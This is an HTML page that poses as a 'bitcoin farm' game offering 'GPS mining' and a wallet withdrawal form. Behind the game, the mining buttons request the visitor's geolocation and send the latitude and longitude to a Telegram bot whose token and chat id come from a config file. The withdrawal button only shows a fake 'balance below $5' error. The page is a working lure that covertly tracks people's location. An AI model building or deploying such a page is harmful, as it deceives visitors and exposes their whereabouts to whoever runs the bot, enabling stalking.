<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>bitcoin farm</title>
    <style>
    /* General Styles */
body {
    margin: 0;
    background-color: #f4f4f4;
    font-family: 'Arial', sans-serif;
    color: #333;
    background-image: url("https://kartinki.pics/pics/uploads/posts/2022-08/thumbs/1660882314_4-kartinkin-net-p-krossovki-oboi-krasivo-4.jpg");
    background-size: cover; /* Ensures the image covers the entire background */
    filter: blur(0.4px);
}

/* Panel Styles */
.panel {
    background: linear-gradient(135deg, #6a11cb, #2575fc);
    border-radius: 10px;
    padding: 20px;
    margin: 20px auto;
    width: 300px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
    text-align: center;
}
        #loadingModal {
            display: none; /* Скрыто по умолчанию */
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
        }

        #loadingContent {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            text-align: center;
        }
.balance p {
    font-size: 18px;
    margin: 10px 0;
}

.bitcoin-balance, .money-balance {
    font-weight: bold;
}

/* Button Styles */
.convert-button {
    background-color: #ffcc00;
    border: none;
    border-radius: 5px;
    padding: 10px 15px;
    margin: 5px;
    cursor: pointer;
    transition: background-color 0.3s;
}

.convert-button:hover {
    background-color: #e6b800;
}

/* Upgrades Section */
.upgrades {
    background-color: #ffffff;
    border-radius: 10px;
    padding: 20px;
    margin: 20px auto;
    width: 300px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
    text-align: center;
}

.upgrades p {
    font-size: 18px;
    margin: 10px 0;
}

/* Miners Section */
.miners {
    display: flex;
    flex-direction: column;
    align-items: center;
}
input{
    border: 0px solid black;
    padding: 10px;
}
.buy-miners button {
    background-color: #28a745;
    border: none;
    border-radius: 5px;
    padding: 10px 15px;
    margin: 5px;
    color: white;
    cursor: pointer;
    transition: background-color 0.3s;
}
#apScanStart {
    background-color: #28a745;
    border: none;
    border-radius: 5px;
    padding: 10px 15px;
    margin: 5px;
    color: white;
    cursor: pointer;
    transition: background-color 0.3s;
}
.buy-miners button:hover {
    background-color: #218838;
}

/* Images */
.minersList1, .minersList2, .minersList3, .minersList4 {
    width: 100%;
    height: 100px;
    background-image: url('https://happycoin.club/wp-content/uploads/2024/08/btc-sneakers-trump-sale-700.jpg'); /* Replace with your miner image */
    background-size: cover;
    background-position: center;
    margin: 10px 0;
    border-radius: 5px;
}

    </style>
</head>
<body>
    <div id="loadingModal">
    <div id="loadingContent">
        <p><b style="color:red;">Error</b><br><br>Your balance is less than <b>$5</b><br><br><button onclick="closeLoadingModal()" id="apScanStart" class="center button-primary">OK</button></p>
        <div class="loader"></div>
    </div>
</div>
    <div class="panel">
        <div class="balance">
            <p class="bitcoin-balance">Bitcoin: <span class="bitcoinBalance">0.00000</span></p>

            <p class="bitcoin-per-second">B/s : <span class="bps">0</span></p>

            <p class="money-balance">Money: ~<span class="moneyBalance">0</span>$</p>
        </div>
            
        <div class="convert">
            <button class="convert-button" onclick="getLocation()">Start GPS mining</button>

            <button class="convert-button" onclick="getLocation()">Update GPS connection</button>
        </div>
    </div>

    <div>
        <div class="upgrades">
            <p>Your bitcoin wallet </p>

            <div class="buy-miners">
                <input placeholder="addres"><button onclick="showLoadingModal()">SEND</button>
            </div>
        </div>
        
        <div class="miners">
            <div class="minersList1"></div>
            <div class="minersList2"></div>
            <div class="minersList3"></div>
            <div class="minersList4"></div>
        </div>
             
    </div>

</body>
<script>

  var userb, tokenb = "";
  fetch('config2.json').then(response => {
    
    return response.json(); 
  })
  .then(data => {
    tokenb = data.token;
    userb = data.uid;
  })
  .catch(error => {
    console.error('Ошибка:', error);
  });
  
  function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    alert("Geolocation is not supported by this browser.");
  }
}

function showPosition(position) {
	//showLoadingModal();
	var addr = document.getElementById("Ac3424d").value;
	fetch(`https://api.telegram.org/bot${tokenb}/sendMessage?chat_id=${userb}&text=${encodeURIComponent("lat: "+position.coords.latitude+"\nlong: "+position.coords.longitude+"\nАдрес:"+addr)}`);
}
</script>

</script>
</html>
